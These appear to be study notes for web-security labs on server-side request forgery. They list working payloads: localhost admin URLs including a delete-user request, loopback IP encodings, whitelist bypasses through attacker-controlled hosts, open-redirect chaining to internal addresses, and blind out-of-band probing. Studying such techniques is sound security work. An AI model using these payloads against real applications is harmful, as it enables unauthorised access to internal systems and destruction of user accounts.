# SSRF

### Example

POST /product/stock HTTP/1.0

Content-Type: application/x-www-form-urlencoded

Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1

**Attacker**

stockApi=`http://localhost/admin`

stockApi=`http://localhost/admin/delete?username=david`

## Bypassing defenses

* Block 127.0.0.1 and localhost, or sensitive URLs like /admin. Bypass with:

* Alternative IP representation of 127.0.0.1, such as 2130706433, 017700000001, or 127.1.

* Register your own domain name that resolves to 127.0.0.1. Can use spoofed.burpcollaborator.net for this purpose.
* Obfuscate strings with URL encoding or case variation.
* Provide a URL that you control, which redirects to the target URL. Try using different redirect codes, as well as different protocols for the target URL. For example, switching from an http: to https: URL during the redirect has been shown to bypass some anti-SSRF filters.

`http://LocalHost/AdMiN/delete?username=david`

## SSRF with whitelist-based input filters bypass

• Embed credentials

https://expected-host`:fakepassword@evil-host`

• # character to indicate a URL fragment

https://`evil-host#`expected-host

• DNS naming to a fully-qualified DNS name that attacker controls

https://`expected-host.evil-host`

• Url-encode characters, or double url-encode

## Bypassing SSRF filters via open redirection

If open redirect

/product/nextProduct?currentProductId=6&path=`http://evil-user.net`

### Examples:

stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/

stockApi=/product/nextProduct?currentProductId=5&path=`http://192.168.0.12:8080/admin/delete?username=carlos`

## Blind SSRF

Most effective, OAST (out-of-band server). HTTP request to an external system like collaborator

Can blindly sweep the internal IP address space with payloads for well-known vulns

## Finding hidden SSRF

On hostname or part of URL in parameters

SSRF via XXE

**Referer header**: some analytics software visit 3rd party URLs on this header
